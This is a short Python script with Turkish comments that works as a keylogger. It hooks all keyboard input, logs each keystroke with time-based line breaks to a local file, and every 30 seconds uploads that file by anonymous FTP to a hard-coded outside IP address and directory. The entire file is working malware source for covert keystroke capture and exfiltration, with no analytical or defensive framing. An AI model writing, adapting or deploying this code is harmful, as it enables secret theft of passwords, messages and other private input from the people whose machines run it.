from ftplib import FTP
import os
import keyboard
import time

last_key_time = 0
klavye_verileri = ""

def on_key_event(e):
    global last_key_time, klavye_verileri
    key = e.name
    timestamp = time.time()

    # Geçen süreyi kontrol et
    elapsed_time = timestamp - last_key_time

    with open("veri.txt", "a") as file:
        # Eğer geçen süre 1 saniyeden fazlaysa ve bu bir ENTER değilse
        if elapsed_time > 1 and key != "enter":
            klavye_verileri += "\n"
            file.write("\n")

        # Her durumda tuşu ekleyip yaz
        klavye_verileri += key
        file.write(f"{key}")

    # En son tuşa basıldığı zamanı güncelle
    last_key_time = timestamp

keyboard.hook(on_key_event)

try:
    while True:
        time.sleep(30)

        # Her 30 saniyede bir klavye verilerini FTP'ye gönder
        ftp_hostname = "188.132.197.244"
        ftp_port = 8889
        ftp_yolu = "/conquerorsZX/kaz/"

        ftp = FTP(f"{ftp_hostname}:{ftp_port}")
        ftp.login()  # Anonim giriş

        with open("veri.txt", "rb") as dosya:
            ftp.cwd(ftp_yolu)
            ftp.storbinary("STOR veri.txt", dosya)

        ftp.quit()

except KeyboardInterrupt:
    print("\nProgram sonlandırıldı.")
